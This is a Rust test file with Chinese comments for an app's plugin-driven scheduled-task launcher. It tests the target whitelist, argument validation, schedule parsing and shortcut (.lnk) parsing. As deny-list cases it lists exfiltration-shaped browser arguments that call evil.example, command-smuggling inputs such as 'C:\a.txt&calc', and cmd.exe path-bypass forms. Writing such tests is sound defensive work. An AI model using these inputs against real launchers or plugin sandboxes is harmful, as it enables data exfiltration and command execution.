        // 系统目录内的 `..\` 写法不该被误杀（canonicalize 后仍在受信目录）
        let plain = format!("{windir}\\System32\\notepad.exe");
        if validate_task_target(&plain).is_ok() {
            let traversed = format!("{windir}\\..\\Windows\\System32\\notepad.exe");
            assert!(
                validate_task_target(&traversed).is_ok(),
                "{traversed} 解析后就是 notepad.exe，不应因写法被拒绝"
            );
        }
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 回归：`.bat`/`.cmd` 经被禁的 `cmd.exe` 解释、`.txt` 根本不是程序，三者都
    /// 必须在入口被拒绝。`.lnk` 现在会被解析，但一个内容不是合法 shell link 的
    /// `.lnk`（这里就是一字节 `x`）同样起不来 —— 拒绝理由从"扩展名"变成了
    /// "解析不出目标"，安全结论不变。
    #[test]
    fn script_and_shell_link_targets_are_rejected() {
        let (_g, dir) = isolate_app_dir("script");
        for name in ["daily.bat", "daily.cmd", "notepad.txt"] {
            let p = dir.path().join(name);
            std::fs::write(&p, b"x").unwrap();
            let e = validate_task_target(&p.to_string_lossy())
                .expect_err("{name} 不能作为定时任务目标");
            assert!(
                e.to_string().contains("仅支持 .exe"),
                "{name} 应被扩展名拦下，实际: {e}"
            );
        }
        let p = dir.path().join("notepad.lnk");
        std::fs::write(&p, b"x").unwrap();
        let e = validate_task_target(&p.to_string_lossy())
            .expect_err("内容不是合法 shell link 的 .lnk 不能起任何程序");
        assert!(
            e.to_string().contains("快捷方式"),
            "假 .lnk 应被解析环节拦下，实际: {e}"
        );
    }

    /// 回归：插件可用 `scheduler_add` 给白名单浏览器传任意参数，而 Lua 沙箱没有
    /// socket —— 浏览器就是它的网络出口，追踪数据会被拼进 URL 外带。
    #[test]
    fn exfil_shaped_args_are_rejected() {
        let _g = isolate_app_dir("args");
        for bad in [
            "--app=https://evil.example/?keys=1234",
            "https://evil.example/a",
            "www.evil.example",
            r"\\evil.example\share\x",
            "--user-data-dir=C:\\ev",
            "C:\\a.txt&calc",
            "C:\\%TEMP%\\x",
            "mailto:x@evil.example",
            // 全角同形字：Chromium 的 scheme 解析只认 ASCII `:`，但仍应被拒
            "https：／／evil.example",
            "ｅｖｉｌ．ｅxample",
        ] {
            assert!(validate_task_args(bad).is_err(), "可疑参数应被拒绝: {bad}");
        }
        // 合法用法不能一并打死
        for ok in [
            "",
            "C:\\notes\\日报.txt",
            "C:\\Windows\\System32\\config.ini",
        ] {
            assert!(validate_task_args(ok).is_ok(), "合法参数应放行: {ok}");
        }
    }

    /// 对抗性输入清单：白名单收紧后能想到的绕过与误杀形态。
    ///
    /// 期望值分两类写死：**必须拒**的（各种绕过尝试）与**必须放行**的
    /// （只是写法不同、实际就是受信程序的那些，拒了就是误伤用户）。
    #[test]
    fn adversarial_target_shapes() {
        let _g = isolate_app_dir("adversarial");
        let sys32 = std::path::Path::new(r"C:\Windows\System32");
        if !sys32.is_dir() {
            return; // 非 Windows
        }
        let deny = [
            // 各种指向 cmd.exe 的写法
            r"C:\Windows\System32\cmd.exe",
            r"C:\Windows\..\Windows\System32\cmd.exe",
            r"\\?\C:\Windows\System32\cmd.exe",
            r"C:\Windows\Temp\..\System32\cmd.exe",
            // 改名伪装：白名单名字出现在非受信目录
            r"C:\Users\Public\calc.exe",
            r"C:\Windows\Temp\notepad.exe",
            // 链接目标不可控 / 经不起 canonicalize
            r"C:\Users\Public\anything.lnk",
            r"C:\Users\Public\daily.bat",
            r"C:\Users\Public\daily.cmd",
            r"C:\Users\Public\notes.txt",
            // 目录、UNC、不存在的文件
            r"C:\Windows\System32",
            r"\\localhost\C$\Windows\System32\notepad.exe",
            r"C:\Windows\System32\definitely_not_here_9x.exe",
            // 相对路径
            r"notepad.exe",
        ];
        for t in deny {
            let e = validate_task_target(t);
            assert!(e.is_err(), "该被拒绝却放行了: {t}");
        }
        // 同一批真实程序，只是写法不同：拒了就是误伤
        let allow = [
            r"C:\Windows\System32\notepad.exe",
            r"C:/Windows/System32/notepad.exe",
            r"C:\Windows\System32\NOTEPAD.EXE",
            r"C:\Windows\..\Windows\System32\notepad.exe",
            r"C:\Windows\SysWOW64\..\System32\notepad.exe",
        ];
        for t in allow {
            if let Err(e) = validate_task_target(t) {
                // 只允许因为「这个文件在这台机器上确实不在」而失败
                let msg = e.to_string();
                assert!(
                    msg.contains("不可用") || msg.contains("不在定时任务白名单"),
                    "合法写法被规则拒绝: {t} -> {msg}"
                );
            }
        }
    }

    /// 参数侧的对抗形态：全角同形字、多参数、控制字符、长度上限。
    #[test]
    fn adversarial_arg_shapes() {
        let _g = isolate_app_dir("adversarial_args");
        let deny = [
            "https：／／evil.example", // 全角冒号斜杠
            "http://evil.example\\@ok.com",
            "C:\\a.txt\nD:\\b.txt",            // 换行造出第二个参数
            "C:\\a.txt\r\n--app=https://evil", // 回车换行同上
            "\u{0}C:\\a.txt",                  // NUL
            "\u{7}C:\\a.txt",                  // DEL
            "--",
            "-",
            "C:\\a.txt\tD:\\b.txt", // Tab 分词
            "https:/evil.example",
            "file:C:\\Windows\\System32\\cmd.exe",
        ];
        for a in deny {
            assert!(validate_task_args(a).is_err(), "该被拒绝却放行了: {a:?}");
        }
        // 超长（查询字符串正是外带的常见形态）
        let long = format!("C:\\a.txt?d={}", "k".repeat(300));
        assert!(validate_task_args(&long).is_err(), "超长参数应被拒");
        for a in [
            "",
            "C:\\a.txt",
            "\"C:\\My Notes\\日报.txt\"",
            "C:\\a.txt C:\\b.txt",
        ] {
            assert!(validate_task_args(a).is_ok(), "合法参数被拒: {a:?}");
        }
    }

    /// 入口与执行前两道校验都要挡下坏参数（库被外部改写的情形）。
    /// 回归：编辑一条任务不该让它当天再被执行一次。
    ///
    /// 判"要不要重置 last_run"原来看的是"调用方传没传 schedule_time"，而插件侧的
    /// `scheduler_update` 永远把七个字段整条传回来（host.rs）—— 于是改个名字、补一条
    /// 参数，都会把今天的执行记录清空，30 秒后那个程序又弹一次。
    #[test]
    fn editing_a_task_keeps_todays_last_run() {
        let _g = isolate_app_dir("edit_keeps_last_run");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return; // 与既有测试同口径：没有 notepad 的机器跳过建任务
        }
        let id = add_task("每日记事本", notepad, "", "daily", "00:01", true).unwrap();
        let today = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        {
            let conn = open().unwrap();
            conn.execute(
                "UPDATE scheduled_tasks SET last_run=?1 WHERE id=?2",
                rusqlite::params![today.clone(), id],
            )
            .unwrap();
        }

        // 只改名字，时刻一字未动
        update_task(
            id,
            Some("改名后的记事本"),
            Some(notepad),
            Some(""),
            Some("daily"),
            Some("00:01"),
            Some(true),
        )
        .unwrap();
        let t = get_all_tasks().into_iter().find(|x| x.id == id).unwrap();
        assert_eq!(
            t.last_run.as_deref(),
            Some(today.as_str()),
            "只改名字不该把今天的执行记录清掉"
        );
        assert!(
            !should_run(&t, &Local::now()),
            "今天已经跑过的任务，改完名字不该立刻又该跑"
        );

        // 反向腿：真的改了时刻，必须清掉，否则新的时刻今天再也不触发
        update_task(
            id,
            Some("改名后的记事本"),
            Some(notepad),
            Some(""),
            Some("daily"),
            Some("00:02"),
            Some(true),
        )
        .unwrap();
        let t2 = get_all_tasks().into_iter().find(|x| x.id == id).unwrap();
        assert_eq!(t2.last_run, None, "改了调度时刻就该重新计一次");
        assert!(should_run(&t2, &Local::now()), "改到新时刻后要能重新触发");
    }

    /// 写库失败时，本轮兜底记忆必须顶得上；重启后则以库里那次为准。
    #[test]
    fn launch_memo_only_adds_what_the_db_lost() {
        assert_eq!(
            effective_last_run(None, Some("2026-09-23 10:00:00")).as_deref(),
            Some("2026-09-23 10:00:00"),
            "库里没写进去（BUSY/表不可用）时要靠内存那次"
        );
        assert_eq!(
            effective_last_run(Some("2026-09-23 09:00:00"), Some("2026-09-23 10:00:00")).as_deref(),
            Some("2026-09-23 10:00:00"),
            "内存里那次更新"
        );
        assert_eq!(
            effective_last_run(Some("2026-09-23 11:00:00"), Some("2026-09-23 10:00:00")).as_deref(),
            Some("2026-09-23 11:00:00"),
            "库里更全时不能被旧记忆盖掉"
        );
        assert_eq!(effective_last_run(None, None), None);
    }

    /// 「库里没有这一条」与「库读不出来」必须是两种回报。
    ///
    /// 两者都返回 `false` 时，插件页对着一条**还在**的任务说"任务 #N 不存在"，
    /// 用户以为删掉了，其实下次到点它照样启动。
    #[test]
    fn delete_task_separates_missing_row_from_unreadable_db() {
        let _g = isolate_app_dir("delete_shapes");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        let id = add_task("留着", notepad, "", "daily", "09:00", true).unwrap();
        assert!(matches!(delete_task(id), Ok(true)), "存在的任务应报删到了");
        assert!(
            matches!(delete_task(id + 4242), Ok(false)),
            "没有这一条才该是 Ok(false)"
        );

        // app_dir 指向一个普通文件 → 附属库根本开不了：这必须是 Err，不能是 false
        let scratch = crate::paths::test_app_dir("delete_unreadable");
        let file = scratch.path().join("not_a_dir");
        std::fs::write(&file, b"x").unwrap();
        crate::paths::set_app_dir(&file);
        let e = delete_task(id).expect_err("读不出库不能被说成「没有这条」");
        assert!(e.to_string().contains("打开定时任务库失败"), "{e}");
        assert!(
            get_all_tasks().is_empty(),
            "读不出来时列表为空是既有口径（会留 error 日志）"
        );
        crate::paths::set_app_dir(crate::paths::test_scratch_app_dir());
    }

    #[test]
    fn add_task_rejects_bad_args_without_storing() {
        let _g = isolate_app_dir("args_entry");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        let e = add_task(
            "exfil",
            notepad,
            "--app=https://evil.example/?d=1",
            "daily",
            "09:00",
            true,
        )
        .expect_err("坏参数不应入库");
        assert!(e.to_string().contains("开关"), "原因应可显示，实得: {e}");
        assert!(get_all_tasks().is_empty());
    }

    /// 回归：入口从来不校验调度配置（只有 UI 侧的 `validate_schedule`，而定时任务
    /// 唯一的入口是插件 API），于是 `"abc:xyz"` 能入库；`should_run` 又按
    /// `unwrap_or(0)` 把它当 00:00 —— daily 的判定是 `now_min >= target_min`，
    /// 结果"建了个坏时间的任务"等于"立刻启动目标程序"。
    #[test]
    fn invalid_schedules_are_rejected_at_entry() {
        let _g = isolate_app_dir("sched_entry");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        for (stype, stime) in [
            ("daily", "abc:xyz"),
            ("daily", "25:00"),
            ("daily", "09:70"),
            ("daily", "9"),
            // 符号那一门：`"-0".parse::<i64>()` 是 Ok(0)，不收就等于"任何时刻都该跑"
            ("daily", "-0:00"),
            ("daily", "+9:00"),
            ("once", "bad"),
            ("interval", "23:00-07:00|30"),
            ("interval", "07:00-23:00|0"),
            ("interval", "07:00-23:00|+30"),
            ("weekly", "09:00"),
        ] {
            let e = add_task("t", notepad, "", stype, stime, true)
                .expect_err("非法调度不该入库: {stype} {stime}");
            assert!(
                e.to_string().contains("调度配置无效"),
                "应说明是调度问题，实得: {e}"
            );
        }
        assert!(get_all_tasks().is_empty(), "被拒的调度不该留下记录");
        assert!(add_task("t", notepad, "", "daily", "09:00", true).is_ok());
    }

    /// 构造一条 daily 任务骨架，便于按字段覆盖出各种调度配置。
    fn daily_task(time: &str) -> ScheduledTask {
        ScheduledTask {
            id: 1,
            name: "t".into(),
            target_path: r"C:\Windows\notepad.exe".into(),
            args: String::new(),
            schedule_type: "daily".into(),
            schedule_time: time.into(),
            enabled: true,
            last_run: None,
            created_at: String::new(),
        }
    }

    /// 已在库里的非法 daily 时间绝不能被当成 00:00（那就是"什么时候都该跑"）。
    #[test]
    fn unparseable_daily_time_never_fires() {
        let noon = Local.with_ymd_and_hms(2026, 3, 5, 12, 0, 0).unwrap();
        for bad in ["abc:xyz", "25:00", "09", "09:70", "", "0:0:0", "  "] {
            let t = daily_task(bad);
            assert!(
                !should_run(&t, &noon),
                "非法时间 {bad:?} 不能被解释成 00:00 然后在 12:00 触发"
            );
        }
        // 合法值照旧：09:00 的任务在 12:00 且今天没跑过 → 该跑
        assert!(should_run(&daily_task("09:00"), &noon));
        assert!(should_run(&daily_task("9:05"), &noon));
        assert!(!should_run(&daily_task("12:30"), &noon));
        // 今天已跑过就不再跑
        let done = ScheduledTask {
            last_run: Some("2026-03-05 09:00:12".into()),
            ..daily_task("09:00")
        };
        assert!(!should_run(&done, &noon));
        // 昨天跑过的，今天到点还要跑
        let stale = ScheduledTask {
            last_run: Some("2026-03-04 09:00:12".into()),
            ..daily_task("09:00")
        };
        assert!(should_run(&stale, &noon));
        // last_run 写成非法格式时按"没跑过"处理，但不能因此放行非法调度
        let junk = ScheduledTask {
            last_run: Some("不是时间".into()),
            ..daily_task("abc:xyz")
        };
        assert!(!should_run(&junk, &noon));
    }

    /// 时钟**往回**跨过午夜，不能把"今天已经跑过"变成放行器。
    ///
    /// 判据原来是 `lr.date() == now.date()`：任务在 10-02 09:00 跑过之后把表调回
    /// 10-01 23:30（NTP 校正、手工对表、向东跨时区），两个日期不再相等 ⇒ 所有到点的
    /// daily 任务当场又启动一遍；而这一遍把 `last_run` 盖成 10-01 23:30，等时钟真的
    /// 走到 10-02 还会再启动第二次 —— 一次回拨换来两次弹出。与同文件
    /// `effective_last_run`「取两个戳里较晚的那个」、`interval` 那一支「往回跳时算出
    /// 负数于是闭嘴」是同一个口径：戳记只会来自过去，来自"未来"的那次一定已经跑过了。
    #[test]
    fn a_backward_clock_jump_does_not_refire_todays_task() {
        let back = Local.with_ymd_and_hms(2026, 10, 1, 23, 30, 0).unwrap();
        let ran_after_the_jump = ScheduledTask {
            last_run: Some("2026-10-02 09:00:12".into()),
            ..daily_task("09:00")
        };
        assert!(
            !should_run(&ran_after_the_jump, &back),
            "戳记比今天还晚 = 那一刻已经跑过了，回拨不该把它变成放行"
        );

        // 反向腿：别把正常节奏一起夹死
        let yesterday = ScheduledTask {
            last_run: Some("2026-09-30 09:00:12".into()),
            ..daily_task("09:00")
        };
        assert!(
            should_run(&yesterday, &back),
            "昨天那次不该挡住 10-01 23:30 这一轮"
        );
        let same_day = Local.with_ymd_and_hms(2026, 10, 1, 9, 0, 30).unwrap();
        let just_ran = ScheduledTask {
            last_run: Some("2026-10-01 09:00:12".into()),
            ..daily_task("09:00")
        };
        assert!(!should_run(&just_ran, &same_day), "同一分钟内跑过就不再跑");
        let before_target = Local.with_ymd_and_hms(2026, 10, 1, 8, 0, 0).unwrap();
        assert!(
            !should_run(&yesterday, &before_target),
            "09:00 的任务不该在 08:00 跑"
        );
    }

    /// 带符号的时钟字段必须拒掉，而**间隔的分钟数**不能被同一层"最多两位"误伤。
    ///
    /// `"-0".parse::<i64>()` 是 `Ok(0)`、`"+9"` 是 `Ok(9)`，于是 `"-0:00"` 一路通过
    /// 校验、存进库、被判成 00:00 —— daily 的判据是 `now_min >= target_min`，
    /// "非法时间"就又等于"任何时刻都该跑"（`unparseable_daily_time_never_fires` 防的
    /// 是同一件事，只是从符号这个门进来）。面板那个输入框是把 `el.value` 原样交下来的
    /// （`desktop/ui/js/main.js`），手抖多带一个 `-` 就进得来。
    ///
    /// 第二条腿是给我自己新加的判据兜底的：`07:00-23:00|120`（每 2 小时）与 `|1440`
    /// 都是正当写法，收紧时钟位时把它们一起夹掉就是修一个洞开一个洞。
    #[test]
    fn signed_clock_fields_are_rejected_without_breaking_long_intervals() {
        for bad in ["-0:00", "+9:00", "-1:30", "09:0 0", "9999:00"] {
            assert!(parse_hhmm(bad).is_none(), "{bad:?} 不该被当成合法时刻");
        }
        for good in ["09:00", "9:05", "0:00", "23:59", " 09:00 "] {
            // 首尾空格是合法写法：`validate_schedule` 判的是 trim 后的值，写侧现在也存
            // trim 后的串，这一层再 trim 一次只是把同一把尺子用到最后一处。
            assert!(parse_hhmm(good).is_some(), "{good:?} 是合法写法");
        }
        assert_eq!(
            parse_interval("07:00-23:00|120"),
            Some((420, 1380, 120)),
            "间隔可以是三位数"
        );
        assert_eq!(
            parse_interval("07:00-23:00|1440"),
            Some((420, 1380, 1440)),
            "间隔甚至可以是四位"
        );
        assert!(
            parse_interval("07:00-23:00|+30").is_none(),
            "带符号的间隔要拒（同一个 `+` 门）"
        );
        assert!(parse_interval("07:00-23:00|-30").is_none());
        // 外层带空格的串现在也能解析：以前 `parse_interval` 里另写了一份**不 trim** 的
        // 解析器，于是"校验通过、入库、执行期永远 None"（见下面那条 trim 用例）
        assert_eq!(
            parse_interval(" 07:00-23:00|30 "),
            Some((420, 1380, 30)),
            "首尾空格不该让一条合法任务永远不执行"
        );
    }

    /// 入库的必须是**校验过的那个串**：校验判 trim 之后的值，写侧原先写的是原样字符串。
    ///
    /// `"2026-12-01 10:00 "`（从记事本粘时刻很容易带上尾空格）于是变成"校验通过、
    /// 落库、然后 `should_run` 永远解析失败返回 false"——一条看着已排好、实际永不执行、
    /// 也一行日志都没有的任务。
    #[test]
    fn stored_schedule_time_is_the_validated_string() {
        let _g = isolate_app_dir("sched_trim");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        add_task("粘来的", notepad, "", "once", " 2026-12-01 10:00 ", true).unwrap();
        let t = &get_all_tasks()[0];
        assert_eq!(
            t.schedule_time, "2026-12-01 10:00",
            "入库的必须是校验过的那个串"
        );
        let later = Local.with_ymd_and_hms(2026, 12, 1, 10, 30, 0).unwrap();
        assert!(should_run(t, &later), "规范化之后这一条才真的到点会跑");
    }

    /// 库里躺着带空格的旧行时：编辑只规范化空格，不算"改了调度时刻"。
    ///
    /// `schedule_changed` 原来拿新串与**原始**库值比，于是 `" 09:00 "` → `"09:00"`
    /// 这一纯规范化会被判成改了时刻 ⇒ 清空 `last_run` ⇒ 当天那个程序又被启动一遍。
    /// `init_db` 那一次性 `TRIM` 规范化也在这里钉住（旧版 Python 的调度库是整份
    /// 复制进来的，`migration.rs` 的 AUX_DBS，那种行靠写侧修不到）。
    #[test]
    fn normalizing_spaces_alone_does_not_reset_the_anchor() {
        let _g = isolate_app_dir("sched_trim_legacy");
        let legacy = r"C:\focusflow-test-dir\不存在的目标.exe";
        {
            let conn = open().unwrap();
            conn.execute(
                "INSERT INTO scheduled_tasks (id, name, target_path, args, schedule_type, \
                 schedule_time, enabled, last_run, created_at) \
                 VALUES (7201, 'legacy', ?1, '', 'daily', ' 09:00 ', 1, \
                 '2026-10-01 09:00:00', '2026-01-01 00:00:00')",
                [legacy],
            )
            .unwrap();
            conn.execute(
                "INSERT INTO scheduled_tasks (id, name, target_path, args, schedule_type, \
                 schedule_time, enabled, last_run, created_at) \
                 VALUES (7202, 'legacy2', ?1, '', 'daily', ' 08:00 ', 1, NULL, \
                 '2026-01-01 00:00:00')",
                [legacy],
            )
            .unwrap();
        }

        // 只改名字、并把手上的 `"09:00"` 传回去：空格被规范化，但锚必须留着
        // （参数顺序是 id, name, target_path, args, schedule_type, schedule_time, enabled）
        update_task(7201, Some("改名"), None, None, None, Some("09:00"), None).unwrap();
        let t = get_all_tasks().into_iter().find(|x| x.id == 7201).unwrap();
        assert_eq!(t.schedule_time, "09:00", "编辑应当顺手把空格规范化");
        assert_eq!(
            t.last_run.as_deref(),
            Some("2026-10-01 09:00:00"),
            "只是规范化空格不该重置防同日重跑的锚（那会当天多启动一次）"
        );

        // 另一条没人碰它：`init_db` 把库里的历史脏行一次性洗干净
        init_db().expect("init_db 必须幂等");
        init_db().expect("重复调用也得幂等");
        let raw: String = {
            let conn = open().unwrap();
            conn.query_row(
                "SELECT schedule_time FROM scheduled_tasks WHERE id=7202",
                [],
                |r| r.get(0),
            )
            .unwrap()
        };
        assert_eq!(
            raw, "08:00",
            "init_db 的一次性规范化要覆盖没被编辑过的旧行: {raw:?}"
        );
    }

    /// 只改调度类型时，必须按**合并后的整对**判定：daily `09:00` 改成 once 而
    /// time 不动，两个字段各自都"没被改坏"，落库后却是一条永不执行的记录。
    #[test]
    fn update_validates_the_merged_schedule_pair() {
        let _g = isolate_app_dir("sched_update_pair");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        let id = add_task("t", notepad, "", "daily", "09:00", true).unwrap();
        let e = update_task(id, None, None, None, Some("once"), None, None)
            .expect_err("daily 的时间配不上 once，必须拒绝");
        assert!(e.to_string().contains("调度配置无效"), "实得: {e}");
        let t = &get_all_tasks()[0];
        assert_eq!(t.schedule_type, "daily", "被拒的更新不该落库");

        // 同时给出两个字段则合法
        assert!(update_task(
            id,
            None,
            None,
            None,
            Some("once"),
            Some("2026-12-01 10:00"),
            None
        )
        .is_ok());
        assert_eq!(get_all_tasks()[0].schedule_type, "once");
        // 不存在的 id 也要说清楚，而不是静默 false
        let e = update_task(9999, Some("x"), None, None, None, None, None)
            .expect_err("不存在的任务不该更新成功");
        assert!(e.to_string().contains("不存在"), "实得: {e}");
    }

    /// 引号只做分组：`"C:\My Notes\日报.txt"` 是一个参数，不是两个。
    /// 只用 split_whitespace 会把它劈成 `C:\My` + `Notes\日报.txt`，后者不是盘符
    /// 路径 → 被拒；而引号本身又被字符黑名单禁止 → 带空格的路径根本没法用。
    #[test]
    fn quoted_arg_with_spaces_is_one_token() {
        assert_eq!(
            split_args(r#""C:\My Notes\日报.txt" other"#),
            vec![r"C:\My Notes\日报.txt".to_string(), "other".to_string()]
        );
        assert_eq!(split_args(""), Vec::<String>::new());
        assert_eq!(split_args("   "), Vec::<String>::new());
        // 引号不闭合也不丢参数（宁可少放行，也不能把后半段漏掉）
        assert_eq!(
            split_args(r#""C:\a b.txt"#),
            vec![r"C:\a b.txt".to_string()]
        );
        assert!(validate_task_args(r#""C:\My Notes\日报.txt""#).is_ok());
    }

    /// 分组能力不能变成绕行口子：引号内的开关、URL、UNC 一样被拒。
    #[test]
    fn quoting_does_not_bypass_arg_rules() {
        for bad in [
            r#""--app=https://evil.example/?d=1""#,
            r#""https://evil.example""#,
            r#""\\evil.example\share\x""#,
            r#""C:\a.txt" "--user-data-dir=C:\ev""#,
        ] {
            assert!(
                validate_task_args(bad).is_err(),
                "加引号不该绕过参数校验: {bad}"
            );
        }
    }

    // ---- .lnk 快捷方式解析 ----

    fn u16z(s: &str) -> Vec<u8> {
        let mut v: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        v.extend_from_slice(&0u16.to_le_bytes());
        v
    }

    fn ansi_z(s: &str) -> Vec<u8> {
        let mut v = s.as_bytes().to_vec();
        v.push(0);
        v
    }

    /// 造一个 .lnk，结构照本机真实快捷方式：LinkInfo 头 7 个 u32，头后先是
    /// VolumeID（含 "system" 卷标），再是 ANSI 编码的 LocalBasePath。
    ///
    /// `slot` 决定 LocalBasePathOffset 落在头部哪个 u32（4 = 文档里的位置，
    /// 5 = 真实文件里的位置），用来证明解析不依赖字段顺序。
    fn make_lnk_at(target: &str, slot: usize) -> Vec<u8> {
        make_lnk_enc(target, slot, false)
    }

    /// `wide` = 路径按 UTF-16LE 存（各家生成器 ANSI / UTF-16 两种都有）。
    fn make_lnk_enc(target: &str, slot: usize, wide: bool) -> Vec<u8> {
        const LI_HEADER: usize = 28;
        let mut volid: Vec<u8> = Vec::new();
        volid.extend_from_slice(&23u32.to_le_bytes()); // VolumeIDSize
        volid.extend_from_slice(&3u32.to_le_bytes()); // DRIVE_FIXED
        volid.extend_from_slice(&0x0000_1010_9fbf_84d7u64.to_le_bytes()); // 卷创建时间
        volid.extend_from_slice(b"system\0"); // 卷名，正好凑满 23 字节
        assert_eq!(volid.len(), 23);
        let path = if wide { u16z(target) } else { ansi_z(target) };
        let li_size = LI_HEADER + volid.len() + path.len();
        let vol_off = LI_HEADER as u32;
        let base_off = (LI_HEADER + volid.len()) as u32;
        let offsets: [u32; 4] = if slot == 4 {
            [base_off, vol_off, 0, 0]
        } else {
            [vol_off, base_off, 0, 0]
        };

        let mut v: Vec<u8> = Vec::new();
        v.extend_from_slice(&(LNK_HEADER_SIZE as u32).to_le_bytes());
        v.extend_from_slice(&[
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x46,
        ]);
        // 与真实快捷方式同一组标志位，除了 HasLinkTargetIDList —— 这个 fixture 不
        // 带 IDList（LinkInfo 因此正好从第 76 字节起，测试里的字节偏移才写得清楚）。
        // 带 IDList 的情形由 idlist_prefixed_link_is_skipped 单独覆盖。
        v.extend_from_slice(&0x40DEu32.to_le_bytes());
        v.resize(LNK_HEADER_SIZE, 0);
        v.extend_from_slice(&(li_size as u32).to_le_bytes());
        v.extend_from_slice(&(LI_HEADER as u32).to_le_bytes());
        v.extend_from_slice(&1u32.to_le_bytes()); // VolumeIDAndLocalBasePath
        for o in offsets {
            v.extend_from_slice(&o.to_le_bytes());
        }
        v.extend_from_slice(&volid);
        v.extend_from_slice(&path);
        v
    }

    fn make_lnk(target: &str) -> Vec<u8> {
        make_lnk_at(target, 5)
    }

    fn write_lnk(dir: &std::path::Path, name: &str, bytes: &[u8]) -> std::path::PathBuf {
        let p = dir.join(name);
        std::fs::write(&p, bytes).unwrap();
        p
    }

    /// 核心安全点：链接目标必须过**同一套**白名单，而不是因为"用户挑的是快捷方式"
    /// 就绕过去。指向 cmd.exe 的 .lnk 依旧要被拒，否则整个黑名单等于没有。
    #[test]
    fn lnk_target_goes_through_the_same_whitelist() {
        let (_l, dir) = isolate_app_dir("lnk_cmd");
        let cmd = r"C:\Windows\System32\cmd.exe";
        if !std::path::Path::new(cmd).is_file() {
            return;
        }
        let p = write_lnk(dir.path(), "shell.lnk", &make_lnk(cmd));
        let e = validate_task_target(&p.to_string_lossy())
            .unwrap_err()
            .to_string();
        assert!(
            e.contains("禁止") || e.contains("白名单"),
            "指向 cmd.exe 的快捷方式必须被拒，实得: {e}"
        );
    }

    #[test]
    fn lnk_resolves_to_the_link_body() {
        let (_l, dir) = isolate_app_dir("lnk_resolve");
        let p = write_lnk(
            dir.path(),
            "np.lnk",
            &make_lnk(r"C:\Windows\System32\notepad.exe"),
        );
        let got = launch_target_of(&p.to_string_lossy()).unwrap();
        assert_eq!(
            got,
            std::path::Path::new(r"C:\Windows\System32\notepad.exe")
        );
    }

    /// 字段顺序不可信：同一条路径放在头部第 4 或第 5 个 u32 指向的位置都得读出来。
    /// （本机真实快捷方式在后一种，文档写的是前一种。）
    #[test]
    fn path_is_found_whichever_header_slot_points_at_it() {
        let target = r"C:\Windows\System32\notepad.exe";
        assert_eq!(
            parse_lnk_target(&make_lnk_at(target, 4)).as_deref(),
            Some(target)
        );
        assert_eq!(
            parse_lnk_target(&make_lnk_at(target, 5)).as_deref(),
            Some(target)
        );
    }

    /// 带 LinkTargetIDList 的快捷方式也要能读出来：必须先按 IDListSize 跳过它。
    #[test]
    fn idlist_prefixed_link_is_skipped() {
        let target = r"C:\Windows\System32\notepad.exe";
        let base = make_lnk(target);
        // 一个占位 PIDL + 列表结束标记；真实文件里这一段可以有几百字节
        let idlist: Vec<u8> = vec![0x14, 0x00, b'.', 0x00, 0x00, 0x00];
        let mut v = base[..LNK_HEADER_SIZE].to_vec();
        v[20] |= 0x01; // HasLinkTargetIDList
        v.extend_from_slice(&(idlist.len() as u16).to_le_bytes());
        v.extend_from_slice(&idlist);
        v.extend_from_slice(&base[LNK_HEADER_SIZE..]);
        assert_eq!(parse_lnk_target(&v).as_deref(), Some(target));
    }

    /// 执行入口校验的必须是**解析出来的那个路径**：链接文件本身存在、也解析得动，
    /// 但目标程序不存在时要报"目标程序不可用"，而不是因为"链接没问题"就放行。
    #[test]
    fn approved_target_validates_the_resolved_path() {
        let (_l, dir) = isolate_app_dir("lnk_approved");
        let p = write_lnk(
            dir.path(),
            "gone.lnk",
            &make_lnk(r"C:\no-such-dir\calc.exe"),
        );
        let e = approved_launch_target(&p.to_string_lossy(), "")
            .unwrap_err()
            .to_string();
        assert!(
            e.contains("不可用"),
            "被校验的必须是解析出来的目标，实得: {e}"
        );

        // 非快捷方式走的是同一套规则（不是"只有 .lnk 才校验"）
        let note = dir.path().join("note.txt");
        std::fs::write(&note, b"hi").unwrap();
        let e = approved_launch_target(&note.to_string_lossy(), "")
            .unwrap_err()
            .to_string();
        assert!(e.contains("仅支持"), "普通文件也要过扩展名规则，实得: {e}");
    }

    /// UTF-16 形态的路径也要认（各家生成器两种都有）。
    #[test]
    fn utf16_encoded_path_is_read_too() {
        let target = r"C:\Windows\System32\notepad.exe";
        assert_eq!(
            parse_lnk_target(&make_lnk_enc(target, 5, true)).as_deref(),
            Some(target)
        );
        assert_eq!(
            parse_lnk_target(&make_lnk_enc(target, 4, true)).as_deref(),
            Some(target)
        );
    }

    /// 链接自带的 Arguments / WorkingDir 一律不参与：否则一个 .lnk 就能往白名单
    /// 程序的命令行里塞任意参数，正是这套白名单要挡的事。
    #[test]
    fn arguments_carried_by_the_link_are_ignored() {
        let target = r"C:\Windows\System32\notepad.exe";
        let mut bytes = make_lnk(target);
        // 把 HasArguments 置上，并在 LinkInfo 之后补一段真实形态的参数区
        bytes[20] |= 0x20;
        let args = u16z("/c calc.exe");
        bytes.extend_from_slice(&(args.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&args);
        assert_eq!(parse_lnk_target(&bytes).as_deref(), Some(target));
        assert_eq!(parse_lnk_target(&make_lnk(target)).as_deref(), Some(target));
    }

    /// 畸形/被截断的快捷方式必须只得到 None（走可读拒绝原因），绝不能 panic ——
    /// release 是 `panic = "abort"`，一次越界就是整个应用消失。
    #[test]
    fn malformed_lnk_is_rejected_without_panicking() {
        let good = make_lnk(r"C:\Windows\System32\notepad.exe");
        let mut cases: Vec<(&str, Vec<u8>)> = vec![
            ("空文件", vec![]),
